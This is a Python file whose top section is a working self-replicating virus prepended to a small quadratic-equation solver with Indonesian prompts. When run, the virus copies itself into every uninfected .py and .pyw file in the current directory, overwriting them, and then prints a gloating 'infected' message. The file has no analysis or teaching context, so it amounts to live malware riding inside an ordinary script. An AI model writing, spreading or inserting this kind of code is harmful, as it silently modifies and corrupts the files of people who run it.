# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
from math import sqrt

a = float(input("koef a : "))
b = float(input("koef b : "))
c = float(input("koef c : "))
D = float(b**2) - float(4*a*c)
x1 = (-b + sqrt(D))/(2*a)
x2 = (-b - sqrt(D))/(2*a)
print("akar x1 = ", x1)
print("akar x2 = ", x2)